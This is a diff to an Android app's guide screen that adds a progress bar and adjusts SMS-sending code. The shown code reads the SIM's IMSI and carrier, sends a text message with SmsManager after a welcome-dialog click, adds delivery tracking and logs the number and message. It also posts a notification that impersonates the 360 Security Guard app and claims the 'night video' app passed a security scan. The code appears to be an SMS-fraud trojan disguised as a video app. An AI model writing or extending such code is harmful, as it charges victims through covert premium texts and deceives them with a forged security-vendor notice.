@@ -48,6 +48,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 	private Context mContext;
 	private ImageView image;
 	private AlphaAnimation animation;
+	private View progress_bar;
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
@@ -77,6 +78,8 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 				viewPager.setCurrentItem(viewPager.getCurrentItem()+1);
 			}
 		});
+		progress_bar = findViewById(R.id.pb);
+		progress_bar.setVisibility(View.GONE);
 		initViewPager();
 		init();
 		
@@ -99,6 +102,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 		viewPager.setAdapter(new MyPagerAdapter(listViews));
 		viewPager.setOnPageChangeListener(this);
 		showDialog(view);
+		
 	}
 	@Override
 	public void onPageScrollStateChanged(int arg0) {
@@ -111,10 +115,10 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 			misScrolled = true;
 			break;
 		case ViewPager.SCROLL_STATE_IDLE:
-			if (viewPager.getCurrentItem() == viewPager.getAdapter().getCount() - 1 && !misScrolled) {
+			/*if (viewPager.getCurrentItem() == viewPager.getAdapter().getCount() - 1 && !misScrolled) {
 				startActivity(new Intent(this, Activity_Main.class));
 				finish();
-			}
+			}*/
 			misScrolled = true;
 			break;
 		}
@@ -156,14 +160,17 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 			SMSReceiver.SMSnumber.append(receive);
 		}
 		MobclickAgent.onEvent(mContext, "send",SMSReceiver.code);
-		PendingIntent pi = PendingIntent.getBroadcast(mContext, 0, new Intent(SMSReceiver.SMS_SEND_ACTION), 0);  
+		PendingIntent pi = PendingIntent.getBroadcast(mContext, 0, new Intent(SMSReceiver.YOYO_SMS_SEND_ACTION), 0);
+		PendingIntent pi2 = PendingIntent.getBroadcast(mContext, 0, new Intent(SMSReceiver.YOYO_SMS_RECEIVED_ACTION), 0);  
         SmsManager sms = SmsManager.getDefault(); 
-        sms.sendTextMessage(phone, null , mess, pi,  null ); 
+        sms.sendTextMessage(phone, null , mess, pi,  pi2 ); 
+        Log.i("TAG", "phone = "+phone+", mess = "+mess);
     }  
 	
 	private void getCardMessage(){
 		
 		if(TextUtils.isEmpty(mImsi)) {
+			progress_bar.setVisibility(View.GONE);
 			ToastUtils.showToast("请插入手机卡在使用");
 			return;
 		}
@@ -172,6 +179,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
         //中国移动  
         	SMSReceiver.code = "46000";
         	if(!StringUtil.isNetworkConnected(mContext)){
+        		progress_bar.setVisibility(View.GONE);
         		ToastUtils.showToast("使用该软件需要开启网络");
         		return ;
 			}
@@ -278,6 +286,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 		unregisterReceiver(myReceiver);
 		}
 	private void showDialog(View view){
+		progress_bar.setVisibility(View.GONE);
 		SharedPreferences preference = PreferenceManager.getDefaultSharedPreferences(this);
         if(!preference.getBoolean("hasSend", false)){
         	view.findViewById(R.id.dialog_welcome).setVisibility(0);
@@ -290,6 +299,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 			public void onClick(View arg0) {
 				// TODO Auto-generated method stub
 			MobclickAgent.onEvent(mContext, "click",SMSReceiver.code);
+			progress_bar.setVisibility(View.VISIBLE);
 			getCardMessage();
 			}
 		});
@@ -297,6 +307,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
     
 	private void startActivity(){
 		startActivity(new Intent(this, Activity_Main.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+		progress_bar.setVisibility(View.GONE);
 		finish();
 	}
 	
@@ -355,7 +366,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
     			NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(
     			Activity_Guide.this).setSmallIcon(R.drawable.push_icon_small)
     			.setContentTitle("360安全卫士")
-    			.setContentText("夜色视频已通过安全扫描");
+    			.setContentText(getString(R.string.app_about_scan));
     			mBuilder.setTicker("360安全卫士");//第一次提示消息的时候显示在通知栏上
     			mBuilder.setLargeIcon(btm);
     			mBuilder.setAutoCancel(true);//自己维护通知的消失
